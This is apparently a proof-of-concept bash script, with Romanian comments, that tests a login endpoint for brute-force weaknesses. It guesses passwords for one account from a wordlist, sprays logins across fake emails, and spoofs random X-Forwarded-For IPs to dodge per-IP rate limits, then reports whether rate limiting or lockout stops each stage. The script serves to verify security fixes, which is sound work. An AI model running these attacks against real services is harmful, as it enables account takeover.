#!/usr/bin/env bash
# poc/4.3_bruteforce_and_lockout.sh
#
# Stage A: brute force pe acelasi cont (wordlist)
# Stage B: spray pe email-uri diferite (acelasi IP)
# Stage C: verificare lockout in DB cu "rotire IP" prin X-Forwarded-For (DEMO)
#
# Usage:
#   ./poc/4.3_bruteforce_and_lockout.sh <existing_email> [wordlist.txt]
#
# Notes:
# - email trebuie sa EXISTE deja (creat prin /api/register).
# - parola reala NU trebuie sa fie in wordlist (altfel vei avea 200 si se opreste).
# - pentru Stage C, backend-ul trebuie pornit cu TRUST_XFF=true ca sa "vada" IP-ul din X-Forwarded-For.

set +e
set +o pipefail

source "$(dirname "$0")/config.sh"

TARGET_EMAIL="${1:-}"
WORDLIST="${2:-}"

if [ -z "$TARGET_EMAIL" ]; then
  echo "Usage: $0 <existing_email> [wordlist.txt]"
  exit 2
fi

LOGIN_URL="$BASE_URL/login"
mkdir -p "$OUT_DIR"

# wordlist default (mica) daca nu dai fisier
if [ -z "$WORDLIST" ]; then
  WORDLIST="$OUT_DIR/43_default_wordlist.txt"
  cat > "$WORDLIST" <<'EOF'
123456
password
qwerty
admin
letmein
000000
111111
abc123
parola
test
Parola123!
ParolaBuna123$
EOF
fi

if [ ! -f "$WORDLIST" ]; then
  echo "Wordlist not found: $WORDLIST"
  exit 2
fi

OUT_FILE="$OUT_DIR/43_bruteforce_and_lockout_$(date +%s).txt"
: > "$OUT_FILE"

echo "Brute force + rate limiting & lockout" | tee -a "$OUT_FILE"
echo "Endpoint: $LOGIN_URL" | tee -a "$OUT_FILE"
echo "Target:   $TARGET_EMAIL" | tee -a "$OUT_FILE"
echo "Wordlist: $WORDLIST" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

LAST_BODY=""

attempt() {
  local label="$1"
  local email="$2"
  local pass="$3"
  local xff="${4:-}" # optional

  local args=(
    -s -i -X POST "$LOGIN_URL"
    -H "Content-Type: application/json"
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}"
  )

  if [ -n "$xff" ]; then
    args+=(-H "X-Forwarded-For: $xff")
  fi

  local res code body
  res="$(curl "${args[@]}")"

  # HTTP/1.1 401 Unauthorized -> 401
  code="$(echo "$res" | awk 'NR==1{print $2}')"

  # body (linie goala separa headerele de body)
  body="$(echo "$res" | awk 'BEGIN{h=1} h && /^\r?$/{h=0; next} !h' | tr -d '\n' | cut -c1-200)"
  LAST_BODY="$body"

  printf "%-44s -> HTTP %s | %s\n" "$label" "$code" "$body" | tee -a "$OUT_FILE"
  echo "$code"
}

# ------------------------
# Stage A: brute force pe acelasi cont
# ------------------------
echo "[A] Brute force pe acelasi cont (wordlist)" | tee -a "$OUT_FILE"
echo "    Vulnerable: 401 la infinit" | tee -a "$OUT_FILE"
echo "    Fixed: lockout dupa N esecuri si/sau 429 rate limit" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_A_RESULT="VULNERABLE"
a_i=0

while IFS= read -r PASS; do
  # skip empty / comments
  if [ -z "${PASS// /}" ] || [[ "$PASS" == \#* ]]; then
    continue
  fi

  a_i=$((a_i+1))
  code="$(attempt "A$a_i try pass='$PASS'" "$TARGET_EMAIL" "$PASS")"

  if [ "$code" = "200" ]; then
    echo "[OK] Stage A: parola corecta gasita: $PASS" | tee -a "$OUT_FILE"
    echo "[STOP] Pentru demo de lockout, scoate parola reala din wordlist." | tee -a "$OUT_FILE"
    exit 0
  fi

  # rate limiting
  if [ "$code" = "429" ]; then
    STAGE_A_RESULT="FIXED (rate limit HTTP 429 dupa $a_i incercari)"
    break
  fi

  # lockout detect (daca serverul returneaza mesaj diferit; daca nu, verifica DB separat)
  if echo "$LAST_BODY" | grep -iq "locked\|blocat\|temporarily locked"; then
    STAGE_A_RESULT="FIXED (account lockout observat in raspuns dupa $a_i incercari)"
    break
  fi

  sleep 0.05

  # limitam ca sa nu dureze mult
  if [ "$a_i" -ge 25 ]; then
    echo "[INFO] Stage A: limita 25 incercari atinsa." | tee -a "$OUT_FILE"
    break
  fi
done < "$WORDLIST"

echo "[RESULT Stage A] $STAGE_A_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

# ------------------------
# Stage B: spray (email-uri diferite)
# ------------------------
echo "[B] Credential spray (email-uri diferite, acelasi IP)" | tee -a "$OUT_FILE"
echo "    Vulnerable: fara 429" | tee -a "$OUT_FILE"
echo "    Fixed: 429 dupa un prag de cereri per IP" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_B_RESULT="VULNERABLE"
TS="$(date +%s)"

for i in $(seq 1 50); do
  e="spray_${TS}_${i}@attacker.test"
  code="$(attempt "B$i spray email=$e" "$e" "WrongSpray_${i}!")"

  if [ "$code" = "429" ]; then
    STAGE_B_RESULT="FIXED (rate limit per IP dupa $i cereri)"
    break
  fi

  sleep 0.02
done

echo "[RESULT Stage B] $STAGE_B_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

# ------------------------
# Stage C: "rotire IP" prin X-Forwarded-For (DEMO)
# ------------------------
echo "[C] Lockout in DB cu 'rotire IP' (X-Forwarded-For demo)" | tee -a "$OUT_FILE"
echo "    IMPORTANT: functioneaza doar daca backend-ul foloseste XFF (TRUST_XFF=true)." | tee -a "$OUT_FILE"
echo "    Scop: chiar daca rate limit per IP poate fi evitat prin IP rotation, lockout-ul per cont ramane." | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_C_RESULT="VULNERABLE"

for i in $(seq 1 15); do
  FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
  code="$(attempt "C$i spoofed IP=$FAKE_IP" "$TARGET_EMAIL" "WrongPass_spoof_${i}!" "$FAKE_IP")"

  # daca serverul raspunde 429 chiar si cu IP-uri diferite
  if [ "$code" = "429" ]; then
    echo "[INFO] Stage C: rate limit (HTTP 429) chiar si cu IP rotation." | tee -a "$OUT_FILE"
  fi

  if echo "$LAST_BODY" | grep -iq "locked\|blocat\|temporarily locked"; then
    STAGE_C_RESULT="FIXED (lockout per cont observat in raspuns dupa $i incercari cu IP-uri diferite)"
    break
  fi

  sleep 0.05
done

echo "[RESULT Stage C] $STAGE_C_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

echo "[DONE] Output salvat in: $OUT_FILE" | tee -a "$OUT_FILE"